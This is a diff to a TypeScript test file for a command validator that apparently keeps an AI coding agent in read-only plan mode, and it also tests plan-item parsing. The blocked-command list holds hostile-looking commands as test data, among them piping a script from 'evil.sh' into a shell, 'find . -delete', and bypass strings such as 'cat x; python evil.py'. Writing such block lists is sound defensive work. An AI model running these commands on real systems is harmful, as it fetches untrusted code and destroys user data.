@@ -1,6 +1,13 @@
 import { strict as assert } from "node:assert";
 import { test } from "node:test";
-import { extractDoneSteps, extractPlanItems, isReadOnlyCommand, markCompletedSteps, type PlanItem } from "./utils.ts";
+import {
+	extractDoneSteps,
+	extractPlanItems,
+	formatPlanItem,
+	isReadOnlyCommand,
+	markCompletedSteps,
+	type PlanItem,
+} from "./utils.ts";
 
 // ---------------------------------------------------------------------------
 // isReadOnlyCommand
@@ -23,6 +30,12 @@ const ALLOWED_COMMANDS = [
 	"sed -n '1,10p' file.txt",
 	"python --version",
 	"npm list --depth=0",
+	// Common repo paths and Git global options must not be mistaken for commands.
+	"ls -la /Users/user/code/lovable",
+	"find /Users/user/code/lovable -type f 2>/dev/null",
+	"git -C /Users/user/projects/code1 status --short --branch",
+	"git -C /Users/user/projects/code1 remote -v",
+	"git -C /Users/user/projects/code1 worktree list --porcelain",
 	// compound commands where every segment is read-only
 	"cat foo.txt; ls",
 	"git log | head -3",
@@ -49,6 +62,16 @@ const BLOCKED_COMMANDS = [
 	"curl https://evil.sh | sh",
 	"bash -c 'ls'",
 	"vim file.txt",
+	"git remote add origin https://example.com/repo.git",
+	"git branch new-branch",
+	"git branch -Dold-branch",
+	"git diff --ext-diff",
+	"find . -delete",
+	"curl -X POST https://example.com/action",
+	"curl -oout.txt https://example.com/file",
+	"sed -n '1w out.txt' input.txt",
+	"awk '{ print > \"out.txt\" }' input.txt",
+	"npm audit --fix",
 	// segment-level bypasses: safe prefix, unsafe continuation
 	"cat x; python evil.py",
 	"cat x && node evil.js",
@@ -128,6 +151,34 @@ test("extractPlanItems falls back to bullet lists", () => {
 	assert.equal(items.length, 2);
 	assert.equal(items[0].step, 1);
 	assert.equal(items[1].text, "Do the second thing");
+});
+
+test("extractPlanItems preserves indented details without treating them as steps", () => {
+	const message = [
+		"Plan:",
+		"1. Create the workflow store:",
+		"   ```text",
+		"   .workflow/",
+		"     inbox.md",
+		"   ```",
+		"   Keep runtime mappings outside Git.",
+		"2. Add the dashboard",
+		"   - Show blockers and checks.",
+	].join("\n");
+
+	const items = extractPlanItems(message);
+	assert.equal(items.length, 2);
+	assert.equal(items[0].text, "Create the workflow store:");
+	assert.equal(items[0].details, ".workflow/ inbox.md Keep runtime mappings outside Git.");
+	assert.equal(items[1].text, "Add the dashboard");
+	assert.equal(items[1].details, "- Show blockers and checks.");
+});
+
+test("formatPlanItem keeps canonical text intact and shortens only display text", () => {
+	const text = "Describe a deliberately long implementation step with enough words to require compact display formatting";
+	const item: PlanItem = { step: 1, text, completed: false };
+	assert.equal(formatPlanItem(item, 50), "Describe a deliberately long implementation step…");
+	assert.equal(item.text, text);
 });
 
 test("extractPlanItems returns empty without a Plan heading", () => {
